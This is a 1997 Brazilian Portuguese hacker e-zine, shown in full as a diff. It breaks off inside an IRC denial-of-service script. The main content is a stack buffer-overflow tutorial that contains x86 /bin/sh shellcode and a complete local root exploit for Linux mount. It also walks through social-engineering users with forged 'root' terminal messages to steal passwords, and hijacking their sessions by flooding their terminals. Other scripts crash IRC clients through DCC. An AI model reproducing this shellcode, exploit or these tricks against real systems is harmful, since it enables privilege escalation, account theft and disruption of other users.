@@ -1,0 +1,1602 @@
+.oO <Start> Oo.
+
+:::::::::::::::::::::::::::::::::::::::::::::::::::::
+:::::::""`````""::::::""`:.:`""::"`````"::'"```'.::::
+:::: .g#S$$$$$S#n  .g#S$$   $$S#n. $$$S#s s#S$$$ ::::
+:::: $$$$$$ $$$$$  $$$$$$ $ $$$$$$ .  $$$ $$$   .::::
+:::: $$$$$$g$$$$$. $$$$$$ $ $$$$$$ :'  $$g$$   .:::::
+:::: $$$$$$ $$$$$$ $$$$$$ $ $$$$$$ ' $$$$ $$$$  '::::
+:::: $$$$$$  $$$$$ $$$$$$.$.$$$$$$ $$$$$ . $$$$$ ::::
+:::: $S$$$$   $$$$ `S$$$$s s$$$$S'.`S$$  :  $$S'.::::
+::::.......:.....:::.............:::....:::....::::::
+:::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+RWX n. 01
+
+dia: 1o/o9/97
+(melhor visto com vi, ou edit)
+
+Endereco: www.cyberspace.org/~rwx
+          www.st.com.br/~rwx
+
+E-mail: rwx@valise.com
+        rwx@st.com.br
+
+---------------------------------------------------------------------[rwx]-
+
+"E' facil  ter-se um sistema de computacao  seguro. Voce  meramente tem  de
+desconectar  o seu  sistema de  qualquer rede externa , e permitir  somente
+terminais ligados diretamente a ele. Por a maquina e seus terminais em  uma
+sala fechada, e um guarda na porta."
+
+F.T Grampp e R.H. Morris
+
+---------------------------------------------------------------------[rwx]-
+ESCLARECIMENTO
+~~~~~~~~~~~~~~
+
+Esta e' uma zine voltada a area de seguranca , seja qual  for sua  intencao
+em ler nao nos responsabilizamos  pelo mau uso das informacoes aqui  conti-
+das. Nao estamos  aqui pra ensinar ninguem a ser Hacker ou  um  terrorista,
+nosso  objetivo e a pura troca  de informacao  entre pessoas  que buscam  o
+conhecimento na rede, e nos opomos aqueles que so visam o lucro. Caso  dis-
+corde de algo  ou tenha alguma sujestao, escreva-nos, ficaremos  felizes em
+ouvi-lo.
+
+---------------------------------------------------------------------[rwx]-
+INDICE
+~~~~~~
+
+ faqz, textos
+ 01#. INTRODUCAO................................................group
+ 02#. OVERFLOWS.................................................auth
+ 03#. HACKEANDO UNIX SYSTEM - Metodos Classicos p1..............skynet
+ 04#. LISTA COMPLETA DE COMANDOS UNIX 2.........................DmS
+ 05#. IRC DCC problems..........................................auth
+ 06#. UM POUCO DE HARDWARE......................................Kbyte
+ 07#. LINUX TRICKS..............................................Kbyte
+ 08#. BACKDOOR's..............................................._KniGHT_
+ 09#. WEBstar...................................................auth
+ 10#. Caching (dns)p1...........................................icmp
+
+ exploits, bugs
+ 11#. COLOR_XTERM...............................................DmS
+ 12#. Ld_S0{1.9.2}............................................._KniGHT_
+ 13#. NT DoS (denial of services)...............................auth
+
+ finalizacoes, pedidos, agradecimentos, emails
+ 14#. EMAILS
+ 15#. FUTURO
+ 16#. PALAVRAS FINAIS
+
+---------------------------------------------------------------------[rwx]-
+01# INTRODUCAO
+~~~~~~~~~~~~~~
+
+Well, well, well, depois daqueles mails, ficamos  ate sem graca de  nao ter
+respondido todos, mas, dai da pra ter uma leve nocao, doque nossa sociedade
+do cyberspace esta se tornando, a  concorrencia esta matando, cada um  quer
+pisar na cabeca do concorrente, ate ontem mesmo teve um amigo meu, que para
+meu ver trabalhava muito bem de webadmin, foi despedido, por uma coisa  que
+nao tem nada haver com sua funcao, mas, para que ? bom, a sede da  internet
+vem revolucionando todos os  meios de telecomunicao, no futuro nao ira mais
+existir correios, as vezes,muitos as vezes, nem aparelhos de televisoes,nem
+de radios, tudo se baseia  agora nessa super rede, ligada simplesmente  por
+cabos, e satelites. Em que fim isso levara, imagine, se  todos nesse mundo,
+que esta virando 'globalizado', terem em mente 'detonar' essa  rede, em que
+mundo  viveremos, no futuro, claro, nao e' mais historias de rpg, que temos
+computadores ligadas  diretamente ao cerebro humano, que seguranca teremos?
+nao sei  ao  certo, mas estamos  aqui para ajudar, pelo menos ate  onde nos
+soubermos, e assim vai  indo. Nao  temos nossa  pagina  atual  ainda, pois,
+recebemos emails  de acho  que, 3 provedores, mas, ai, mandamos nosso  mail
+pra essa galera, mas, nada de resposta. Oque eh isso, sera que nada vai ser
+consientizado ? po, recebemos muitos emails de usuarios parabenizando  pela
+nossa iniciativa, para esses obrigado, e que continuem a mandar seus mails,
+mas tipo, mas que mandem mesmo, so' assim saberemos que voces estao  lendo,
+e como  mudar algo que nos  fizemos. Chega de bla,bla,bla... Vamos  ao  que
+interessa,agora temos  mais dois 'irmaozinho BASH',o nome das  figuras  sao
+kbyte, e Knight, eles com certeza sabem oque  estarao escrevendo, por isso,
+espero  a todos mais uma  sincera colaboracao, com  eles. :), Nessa  edicao
+do zine, teremos algumas coisas legais,do tipo,aqueles segredos do overflow
+,lembram daqueles exploits de mount,de rlogin, e tudo ? tai, em vez de voce
+so' ir  pegar o  exploit la na cert, ou em outro lugar, explicamos  de modo
+simples.Tem tambem, algumas  tecnicas de  invasao, as  tecnicas  classicas,
+aquelas em que, o admin, faz mais parte do que o 'invasor'.Tambem  temos  o
+DmS,colocando em pratica a segunda parte dos comandos, acho  que e' a maior
+lista, e  mais completa de comandos unixoides em portugues. Fora as  partes
+dos problemas de DCC,e as partes de hardware e algo complementand os textos
+anteriores. Entao, nao deu para colocarmos  muita coisa de mac, e fico  soh
+um testinho pequeno, infelizmente, empurramos para a proxima! :))
+Enfim,fizemos oque era esperado acho que deu para superar a versao passada,
+e assim, ate conseguirmos achar um admin que nos ache um lugar.
+
+Pedido de desespero: MANDEM EMAILS! e que algum admin sagrado nos ajude! :)
+
+O grupo
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+01# OVERFLOWS
+=============
+auth 97
+
+Bom,esta parte,reservo aos  programadores de nivel medio a superior, estara
+detonando na parte completa de stack overflows  em sistemas unix, mas, como
+ja  existe muito texto porai  com muita  coisa disso, aqui  ficou um  pouco
+resumida, por isso, nem ligue se voce nao achar este  texto la aquela coisa
+legal,  so' quero  introduzir oque, e os perigos existentes  nos overflows,
+mas, se voce  quiser saber mais sobre assembler, peco  a ir procurar um bom
+manual na net!
+
+--------------------------------------------------------------------[auth]-
+Stack - introducao
+~~~~~~~~~~~~~~~~~~
+a principal  funcao de  qualquer cpu, e' processar e mover data, em  quanto
+processa ou move algo,o cpu necessita de algum lugar para salvar informaco-
+es importantes rapidamente. essa  informacao e' salva no  stack. o stack e'
+uma parte especial da memoria,que pode ser acessada com comandos especiais.
+o stack e' variavel em tamanho e posicao.
+
+:se um registro N e' usado e um sub-processo e' executado tambem,o registro
+N, e' salvo no stack,que logo apos o processo ter acabado, sera recuperado.
+para a rapidez,o cpu usa varios comandos especiais de stack, q proporcionam
+mais rapidez as mudancas.
+:se um processo e' executado  e o cpu precisa saber onde voltar  em caso do
+processo terminar, o 'return adress' e' salvo no stack, antes de executar o
+processo e  depois de  terminado, o cpu  vai ao 'return adress' guardado no
+stack.
+
+se um programa cria  ou recebe  info, a nova  info tem que  ser guardada na
+memoria,todos os programas usam 'dynamic data' para guardar informacoes, ou
+seja, a CPU cria os espacos na stack, se ela for usada, sera usada, mas  se
+ela nao for mais precisa, as variaveis serao dinamicas.
+
+:se um processo ira mexer em duas variaveis, precisara da terceira (c) para
+guardar.A variavel (c) sera instalada no stack e removida quando o processo
+for terminado.
+
+ (a <-> b)
+  c <-  b
+  a <-  b
+ (b <-  c)
+
+isso foi so' uma  base para o que e' de que forma e' feito o  funcionamento
+do stack, mas o lado  malefico disso,  sao os exploits, que  sao muito  bem
+feitos, para o usuario conseguir root, e assim detonar seu sistema.
+
+--------------------------------------------------------------------[auth]-
+Estrutura do Stack
+~~~~~~~~~~~~~~~~~~
+a primeira coisa  guardada no stack sera  a ultima a ser lida, e a ultima a
+ser guardada sera a primeira  a ser lida, esse sistema e' chamado de  LIFO,
+ou "last in,first out" (ultimo dentro, primeiro a sair),vamos a um exemplo,
+vamos executar um programa (em caso, para conseguir root mais tarde, hehe),
+como o stack pareceria quando o processo chamaria suas variaveis dinamicas?
+
+                          .
+                          :   ...                 .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |  ...
+                          |-----------------------|
+             -1024 bytes  |   local array2[1024]  |  size 1024 bytes
+                          |-----------------------|
+  posicao atual do stack  |   base pointer        |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  |   return adress       |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  :   parametros ...      |  ...
+                          .                       :
+
+as variaveis sao  diferentes, e a informacao e' guardada no stack, todo cpu
+usa um 'stack pointer', para  marcar a posicao atual, e' chamada  de SP. as
+partes a serem analizadas  serao o 'local array2' e o 'return  adress', so'
+isso e' necessario para termos root.
+
+--------------------------------------------------------------------[auth]-
+Mandando bronca no 'return'
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+lembrando,quando e' executado algo,o CPU salva um 'return adress' no stack,
+se o processo e' finalizado, o cpu pula e acha o 'return adress'. mas, se o
+processo salva mais  bytes em uma variavel local do que seu tamanho normal,
+ira acontecer o 'overwrite', ira  sobrescrever  o 'return adress' antigo, e
+assim sera nomiado 'overflow'.
+
+se (1024+8)1032 vezes o caractere "x" for escrito no array2 local,o proces-
+so ira escrever novamente o 'return adress'. e o stack ira parecer:
+
+                          .
+                          :   ...                 .  .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |  ...
+                          |-----------------------|
+             -1024 bytes  |   1024 times "X"      |  size 1024 bytes
+                          |-----------------------|
+  posicao atual do stack  |      4 times "X"      |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  |      4 times "X"      |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  :   parametros ...      |  ...
+                          .                       :
+
+assim, agora nos poderemos forcar o programa a pular onde nos quizermos!
+ira sera muito legal. poderemos criar um codigo no 'local variable'.
+                                                  .
+                          :   ...                 .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |
+                          |-----------------------|
+             -1024 bytes  |   our code            | < -
+                          |-----------------------|    |
+  posicao atual do stack  |   4 bytes de lixo     |    |
+                          |-----------------------|    |
+                +4 bytes  |   nosso codigo! hehe  | ___|
+                          |-----------------------|
+                +4 bytes  :   parametros ...      |
+                          .                       :
+
+se  esse  programa e'  'ownned' do  root, e tem a 'suid  flag' datada  como
+um normal user, teremos  privilegio de root  quando executada, nosso codigo
+pode fazer algo como 'root', hehe.
+
+--------------------------------------------------------------------[auth]-
+Executando a shell em assembler ou em c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+se nosso  codigo executara uma shell  normal, e nos  criamos o programa  de
+overflow,poderemos ter todos os privilegios de root.nos precisaremos agora,
+e' de um pequeno codigo em assembler que ira executar a shell,nao e' neces-
+sario mesmo executar a shell,mas, neste caso, oque interessa e' o root. he,
+voce  pode conseguir  a shell em assembler, ou  compilar  ela em 'c', com a
+denominacao do 'execshell'.
+
+ codigo em assembler:
+ ~~~~~~~~~~~~~~~~~~~~
+                jmp    end_of_code
+ execve:        popl   %esi
+                movl   %esi,0x8(%esi)
+                xorl   %eax,%eax
+                movb   %eax,0x7(%esi)
+                movl   %eax,0xc(%esi)
+                movb   $0xb,%al
+                movl   %esi,%ebx
+                leal   0x8(%esi),%ecx
+                leal   0xc(%esi),%edx
+                int    $0x80
+                xorl   %ebx,%ebx
+                movl   %ebx,%eax
+                inc    %eax
+                int    $0x80
+ end_of_code:   call   exec_prog
+                .string "/bin/sh\"
+
+ codigo em c:
+ ~~~~~~~~~~~~
+ char execshell[] =
+        "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+        "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+        "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+se voce prestar atencao acrescentamos 8 bytes, se quizermos mexer no
+'return adress', nos teremos  que sobrescrever 4 bytes da 'base pointer', e
+4 bytes do 'return adress'.
+
+ #define lv_size=1024
+ char buffer[lv_size+8]
+
+   ...  <bla> <bla> <bla> <bla> <bla> <codigo com a shell>
+
+olhando este proximo exemplo feito em C,poderemos aprender como fazer isso,
+lv_size eh usado como o tamanho da variavel,execshell,e' usada como 'char',
+como nosso codigo  em assembler, teremos ali  tambem, o lugar onde o  shell
+sera executado. ptr e' o pointer que sera o espaco que iremos copiar  sobre
+a variavel local.
+
+ex 1:
+
+    for(i=0;i<lv_size-strlen(execshell);i++)
+    ptr[i]=0x90;
+    for(i=0;i<strlen(execshell);i++)
+    ptr[i+lv_size-strlen(execshell)]=execshell[i];
+
+ex 2:
+
+    memset(ptr,0x90,lv_size-strlen(execshell));
+    ptr+=lv_size-strlen(execshell);
+    for(i=0;i<strlen(execshell);i++)
+    *(ptr++)=execshell[i];
+
+--------------------------------------------------------------------[auth]-
+Retornando ao verdadeiro Stack
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+voce  lembra qual posicao e  tamando a  variavel no stack  tinha ? se  nao,
+volte atras, nos  usaremos uma pequena funcao para pegar o lugar do  stack,
+salvando o SP, este  endereco e' o comeco  da stack, antes  de instalar  as
+variaveis locais, e os 'return adress', sera datado como VSP (sp velho).
+teremos que adicionar uma  variavel offset no vsp, este offset tem  que ser
+grande para  que o cpu bata novamente em um nop, quando pular para achar  o
+'return adress'.
+
+---------------------------------------------------------------------------
+ no operation - nop - para sistemas diferentes:
+---------------------------------------------------------------------------
+ linux/i80386+                            -  char nop[1]=0x90;
+ bsd/os/i80386+ and freebsd/i80386+       -  char nop[1]=0x90;
+ solaris/sparc processor                  -  char nop[4]=0xac15a16e;
+ sunos/sparc processor                    -  char nop[4]=0xac15a16e;
+ hp-ux9/hp9000                            -  char nop[4]=0xac15a16e;
+
+                          .                       .
+                          :                       .
+                   VSP -> |-----------------------:        ------
+             -2048 bytes  |   local array1[1024]  |              | offset
+                          |-----------------------|              | maior
+             -1024 bytes  |   <...>               |              | que
+                          |   <bla>               |              | 1024
+                          |   <bla>               |        ______|
+                          |   <bla>               | < -   VSP + offset
+                          |   <bla>               |    |
+                          |   <nosso codigo>      |    |
+                          |-----------------------|    |
+  posicao atual do stack  |   4 bytes de lixo     |    |
+                          |-----------------------|    |
+                +4 bytes  |   adress: VSP+offset  | ___|
+                          |-----------------------|
+                +4 bytes  :   parametros ...      |
+                          .                       :
+                                                  .
+Ex 1:
+ ptr2=(long *)ptr;
+ *ptr2=get_sp()+offset;
+
+Ex 2:
+ ptr2=(long *)ptr;
+ for(i=1;i<8;i++)
+ *(ptr2++)=get_sp()+offset;
+
+--------------------------------------------------------------------[auth]-
+Comandos de 'enviroment'
+~~~~~~~~~~~~~~~~~~~~~~~~
+agora, chega de basico, vamos ao  interessante, o programa que sera atacado
+sera 'owned' do root. exemplo de como achar:
+
+-------------------------------------------------------------------[corte]-
+ #!/bin/sh
+ find /bin -user root -perm +a=s > suid.lst
+ find /sbin -user root -perm +a=s >> suid.lst
+ find /usr/bin -user root -perm +a=s >> suid.lst
+ find /etc -user root -perm +a=s >> suid.lst
+ find /var -user root -perm +a=s >> suid.lst
+-------------------------------------------------------------------[corte]-
+
+voce deve estar cansado  disso, mas, esqueci de falar uma coisa, como  voce
+achara um programa que seja bugado para o overflow ?
+
+cat /teste.teste
+    ^ variavel (tipo: char[256])
+
+usando uma variavel de 'enviroment', "set TERM=4321"
+o programa  ira usar a variavel TERM no  buffer, mas o tamanho desse buffer
+pode ser diferente, na  ordem de dar  'overflow', ira checar  os  tamanhos,
+como '256, 512,1024...', os  programas mais faceis de  dar 'overflow', sao:
+
+ mount.c  - linux version: < 2.0.8
+ rdist.c  - all bsd version: 2.0
+ rlogin.c - solaris version: 2.5 & 2.5.1
+
+Exemplo de mount:
+
+/* -----------------------------------------------------------------------
+   mount.c - mount exploit for linux - version: < 2.0.10
+   ----------------------------------------------------------------------- */
+
+ #include <stdio.h>
+
+ #define lv_size  1024
+ #define offset     30+lv_size+8*4
+ // --------------------------------------------------------------------------
+ long get_sp()
+ {
+   __asm__("movl %esp, %eax");
+ }
+ // --------------------------------------------------------------------------
+ main(int argc, char **argv)
+ {
+   char execshell[] =
+          "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+          "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+          "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+  char buffer[lv_size+4*8];
+  unsigned long *ptr2 = NULL;
+  char           *ptr = NULL;
+  int           i;
+
+  for(i=0;i<lv_size+4*8;i++)
+   buffer[i]=0x00;
+  ptr=buffer;
+
+  for(i=0;i<lv_size-strlen(execshell);i++)
+   *(ptr++)=0x90;
+  for(i=0;i<strlen(execshell);i++)
+   *(ptr++)=execshell[i];
+  ptr2=(long *)ptr;
+  for(i=1;i<2;i++)
+   *(ptr2++)=get_sp()+offset;
+
+  printf("rwx rox!\n");
+  (void)alarm((int)0);
+  execl("/bin/mount", "mount", buffer, NULL);
+ }
+
+-------------------------------------------------------------------[corte]-
+se voce notar, vc ira ver que tudo  oque foi explicado esta neste  exemplo,
+por exemplo:
+
+ #define lv_size  1024
+ #define offset     30+lv_size+8*4 <---- acrescentados
+
+========
+
+ uso do 'execshell':
+
+ char execshell[] =
+          "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+          "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+          "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+========
+
+ printf("rwx rox!\n"); <--- "rwx rox"...
+  (void)alarm((int)0);
+  execl("/bin/mount", "mount", buffer, NULL); <--- programa...
+
+espero ter colaborado a turma ai, a ver e aprender um pouco sobre os
+'overflows', nao se esqueca, isso e' somente para demonstracao!
+proxima edicao tem mais!
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+03# HACKEANDO UNIX SYSTEM - Metodos Classicos - parte 1
+=======================================================
+By SKyNet
+
+Hi d00dz,
+
+Um Pouco de historia
+~~~~~~~~~~~~~~~~~~~~
+Num certo dia de 1993, como era de costume,liguei pro modem de uma institui-
+cao do governo  de Pernambuco. Na  epoca, o acesso a internet era  restrito,
+somente Universidades e Orgaos do Governo  tinham  acesso.
+Sendo  eu  um  simples  estudante  do segundo  grau  nao  podia  ter  acesso
+a internet, pois nao existiam  provedores comerciais. Entao eu e mais alguns
+amigos acessavamos a Internet explorando um bug no Gopher dessa maquina  que
+nos  dava acesso  direto ao Telnet  Client. So  que numa  dessas  investidas
+aconteceu uma  coisa incrivel comigo, por muita sorte cai sem mais nem menos
+direto  no  shell  do root!  A  partir  desse  dia  fiquei  me  perguntando:
+Como isso e possivel??? Entao passei  a estudar o caso com mais  atencao. Li
+dezenas de  textos, livros, e com a  troca de informacao com meus amigos  do
+underground adiquiri alguns conhecimentos. Pretendo passar alguma coisa  que
+aprendi.Vc que e Admin de algum sistema,seja qual for,use para seu proveito,
+so nao quero que venham me acusar de terrorismo de redes!
+
+1.Introducao
+~~~~~~~~~~~~
+Nesta materia vou descrever  algumas das tecnicas mais usadas pra se hackear
+Unix System, nao com mas intencoes,muito pelo contrario, quero deixar  claro
+que  o  que vai ser explicado eh com fim  de  esclarecer muita gente  que as
+vezes eh vitima.  Algumas  dessas tecnicas sao  bastante  antigas, nao  e  a
+toa que denominei o titulo dessa materia de "Metodos  classicos", creio  que
+todos os Admins (competentes) ja  devam conhecer pelo menos d e ouvir falar.
+Mas, visamos tambem o leitor com menos conhecimento no assunto.
+Por uma questao de  espaco resolvi  resumir algums pontos,se nao esse  texto
+iria ficar tao grande que poderia ocupar 50% do tamanho dessa zine! :-)
+
+2. Roubando senha de usuarios (Metodo Burlando Terminais)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Algumas versoes do Unix  vem com  permicao de escrita no  terminal  e o mesg
+vem  habilitado  por default. Isso permite que vc  "brinque" de gato e  rato
+os usuarios  menos experientes podendo desde  desconecta-los do sistema  ate
+o roubo de suas senhas.
+
+3. Fake write
+~~~~~~~~~~~~~
+O primeiro metodo e  o mais simples consiste  em mandar um "fake root write"
+para um usuario  do sistema solicitando  a alteracao de sua  senha. A  coisa
+parece ser muito facil falando assim, mas vc tem que ter muita malicia, alem
+de  saber  fazer a coisa  na hora certa, com a pessoa certa. Vou citar ainda
+nesta materia algumas dicas de como e quando vc deve usar o Fake Write.
+Vejamos...
+Primeiro devemos  escolher um usuario. Mas  que usuario?! Nesse caso  o mais
+ingenuo possivel! Pois  o cara  tem que ser  realmente muito  "inocente" pra
+cair numa dessas... pior que  eh o  que nao  falta  por ai. Embora esse  nao
+seja meu estilo  de pegar  senhas, ja  vi muito  casos assim. Geralmente  um
+usuario inexperiente e aquele que so acessa o sistema basicamente pra checar
+emails ou outras atividades unicas,e comum encontrarmos esse tipo de usuario
+em algumas Universidades.
+
+Os unicos requisitos necessarios pra usar a tecnica abaixo e ter  obviamente
+uma conta no sistema e principalmente que os terminais estejam com  permicao
+de escrita. Algumas versoes  do Unix vem com  permicao +w por default, nesse
+caso facamos o seguinte...
+
+ cyberdine:/tmp$ cat > fkmsg
+ [Aqui vc digita a mensagem que deseja enviar]
+
+ Message from root console...
+
+ Caro usuario,
+ Para  sua seguranca  estamos fazendo troca de senhas em nosso servidor, por
+ favor altere sua senha para "abcd9206".
+
+ Agradeco sua compreencao.
+ Skynet
+ (Gerente de Seguranca Internet)
+ <EOF>
+
+ [CTRL-C]
+ cyberdine:/tmp$
+
+ OBS: Vc deve usar sua criatividade, pode fazer qualquer coisa com isso!
+      Agora vamos ver em quem vamos usar.
+
+ cyberdine:/tmp$ w
+   7:41am  up 20 min,  3 users,  load average: 0.78, 0.27, 0.11
+ User     tty      From              login@  idle   JCPU  PCPU  what
+ victim   tty1                       7:23am     1               vi lamah.txt
+ skynet   tty2                       7:37am                     w
+
+K00l!  Escolhida  a vitima, o que nos  interessa acima e apenas o  nome  do
+terminal que o mesmo ta logado.
+Agora vamos mandar o conteudo da "mensagem" para que ele receba na tela....
+
+ cyberdine:/tmp$ cat fkmsg >/dev/tty2
+
+hehehe... se ele for MUITO otario vai cair na sua!
+Caso nao tenha conseguido exito, nao  desanime ha coisas melhores ainda  por
+vir. ;-)
+
+-------------------------------------------------------------------[skynet]-
+
+ 4. DETACHED ACCOUNTS
+ ====================
+ Systemas (Unix System V, SunOS, XENIX,..???..)
+
+Um dos mais fantasticos furos nos sistemas Unix que apavoravam os admins.
+Pra quem nao sabe dele vou falar um pouco a respeito.
+Lembram no inicio do texto que eu falei sobre o que tinha acontecido comigo
+numa vez que eu tinha caido numa shell sem  ao menos ter digitado o login?!
+Poise, aquilo foi nada mais do que uma detached account, que foi deixada no
+sistema ou por algum hacker que no momento tentava detonar a maquina,ou,por
+puro acidente mesmo. Mas como eu sei se ha uma detached account no sistema?
+Bah, vc nao deve fazer nada, vc deve provoca-la, heheheheh!!
+Pra isso precisamos q o system deve estar com permicao de write no terminal.
+veja o exemplo:
+
+ cyberdine:/tmp$ cat /bin/sh >/dev/tty2
+
+ OBS: Quanto MAIOR for o arquivo binario, melhor ainda...
+
+Isso vai fazer com que apareca na tela do cara um monte de sujeira que fica
+passando insistentemente ate que ele seja OBRIGADO a desconectar sem usar o
+LOGOUT! E ai que comeca nossa brincadeira,.
+Pra ter certeza de que ele desconectou basta dar um 'who' se aparecer outro
+nome igual aquele  que vc detonou, certamente ele conectou novamente. Resta
+agora tentar  entrar no  sistemas repetidas  vezes  ate cairmos no terminal
+detached e com isso na conta daquela pessoa que derrubamos! Simples,han?!
+
+Proxima edicao tem mais! :)
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+04# Unix Commands PARTE 2 by DmS
+================================
+Como prometido irei continuar a lista de comandos para UNIX!! :)
+---------------------------------------------------------------------------
+
+mount   Serve para "mountar"(Tornar o algo importado como uma coisa local)
+        um diretorio ou particao. Por exemplo se voce quiser visualizar o
+        conteudo de um disquete, voce o "mounta" com o mount.
+        Linha: mount origem destino
+
+        "Mountando" o floppy :
+        Crie um dir no raiz chamado /floppy e digite:
+        mount /dev/fd0 /floppy  ou
+        mount /dev/fd1 /floppy dependendo do local do seu floppy. Se
+        ele for drive A: no DOS sera fd0, se for B: sera fd1.
+        Ai vc vera o conteudo do disquete a partir do dir /floppy
+
+        "Mountando" o CD-ROM :
+        Crie um dir no raiz chamado /cdrom e digite:
+        mount -t iso9660 -r /dev/cdrom /cdrom
+        Todo o conteudo do CD sera visualizado no dir /cdrom
+
+umount  Serve para "desmountar" um diretorio ou particao.
+        Apos voce "mountar" qualquer coisa e nao quiser mais usar-lo, voce
+        tera que "desmounta-lo". A linha do comando umount sera sempre
+        umount <dir>.
+
+df      Utulizado para visualizar espaço nas particoes.
+        Exemplo:
+        Filesystem         1024-blocks  Used Available Capacity Mounted on
+        /dev/hdb1             791155  285322   464961     38%   /
+        /dev/hda1            2060032 1080544   979488     52%   /dosc
+
+du      Visualizar espaco ocupado por aqueles arquivos do diretorio.
+        Opcoes aconselhadas: -a
+
+cc      Compilador C do sistema UNIX.
+        Opçoes: -o
+        Linha: cc -o arquivo arquivo.c
+
+find    Procurar arquivos no sistema
+        Linha: find diretorio_do_arquivo -name nome_do_arquivo
+
+cp      Copiar e/ou duplicar arquivos
+        Linha: cp origem_do_arquivo destino_do_arquivo          ou
+               cp arquivo arquivo1
+
+mv      Mover e/ou renomear arquivos
+        Linha: mv origem_do_arquivo destino_do_arquivo          ou
+               mv arquivo arquivo1
+
+date    Exibe data e hora do sistema
+
+grep    Comando usado para identificar um linha em certo arquivo.
+        Exemplo: grep rwx /etc/passwd     ou
+                 cat /etc/passwd | grep rwx
+        Ele verificara todas as entradas rwx no arquivo passwd.
+
+free    Mostrara a quantidade de memoria fisica e a memoria swap livre e
+        usada pelo sistema, como tambem mostrara shared memory e buffers
+        usados pelo kernel.
+
+head    Usado para mostrar as dez primeiras linhas(default) de um certo
+        arquivo.
+        Linha: head -c Nb arquivo ; onde N e o numero de bytes que serao
+        exibidos. Vc pode usar em vez da letra b apos o N, as letras
+        k(kilobytes) ou m(megabytes).
+
+tail    Verifica as 10 ultimas linha dum certo arquivo, e com a
+        opcao -f espera infinitamente por novas linhas no final.
+        Perfeito para se usar em logs.
+        Opcoes: -f
+        Linha: tail -f arquivo
+
+ln      Serve para linkar um arquivo a um diretorio ou outro arquivo.
+        Linha: ln origem destino
+
+netstat Mostra todas as conexoes TCP, UDP, RAW e UNIX sockets.
+        Opcoes: -a
+
+su      Comando usado para trocar de user sem precisar dar um logout.
+        Recomendado usar-lo sempre ainda mais se vc for um admin pois
+        ficar logado como root nao e aconselhavel.
+        Linha: su <user>
+        E logo depois ele pedira a senha se vc for um user normal. Se for
+        o root do sistema nao ira precisar de senha alguma.
+
+touch   Cria um arquivo vazio.
+        Linha: touch arquivo
+
+uname   Exibe informacoes do sistema.
+        Opcoes: -a
+
+mailx   Verifica novos mails na caixa de mensagem.
+
+showmount
+        Exibe diretorios mountados da maquina local ou qualquer outra.
+        Opcoes: -ae
+        Linha: showmount -ae IP_DA_MAQUINA
+
+Proxima edicao tem mais!
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+05# IRC DCC problems
+====================
+auth 97
+
+Este texto,nao e' para qualquer cara chegar e comecar a derrubar os outros,
+por isso, e' so' mais um texto para os admins lerem e ver, oq seus usuarios
+'bonzinhos' podem fazer com sua rede de irc, por isso, e' necessario  setar
+bots e dar uma dura em muitos ircops porai.
+
+DCC e' o irc protocolo de 'client-side'usado para mandar informacao direta-
+mente entre dois clientes, normalmente,quando uma mensagem e' mandada entre
+2 clientes,ela vai do cliente do usuario ate o seu servidor,do seu servidor
+ele ira para o servidor do outro usuario,e assim chegara ao cliente do usu-
+ario.
+
+Esquema:
+
+        1. Seu cliente de irc abre uma porta de tcp (>1024), e espera uma
+           conexao.
+
+        2. Seu cliente de irc manda:
+           A) o nome do arquivo
+           B) seu endereco IP
+           C) o numero da porta de tcp
+           D) o tamanho do arquivo (em bytes)
+
+        3. O cliente irc quando abre a porta para conexao especifica seu ip,
+           transmite um pouco de lixo para inicializar a transferencia, e ai
+           joga o file.
+
+        4. Nessa hora, seu cliente de irc, para de receber outras conexoes
+           naquela porta.
+
+Alguns Problemas
+~~~~~~~~~~~~~~~~
+O ircII mais antigo que a versao 2.82 trava,quando alguem tenta mandar-lhe
+um arquivo, mas com o ip trocado, um exemplo basico:
+
+dcckill.irc:
+
+echo Loading DCC KILL
+echo Syntax: DCCK nick filename size
+echo         ^Bfilename^B and ^Bsize^B are bogus values.
+alias DCCK {
+                ^assign dcc_killing 0
+                //quote PRIVMSG $0 :^ADCC SEND $1 12341234 4321 $2^A
+                echo *** Sent DCC KILL request to $0
+                ^assign dcc_killing 1
+           }
+
+Um truque parecido, e' direcionar o cliente remoto de irc para conectar
+a alguma porta de alguma maquina em um t3.Voce pode fazer isso para encher
+seu colega de testes com lixo.
+
+dccchargen.irc:
+
+echo Loading DCC CHARGEN
+echo Syntax: DCCCHARGEN nick filename size
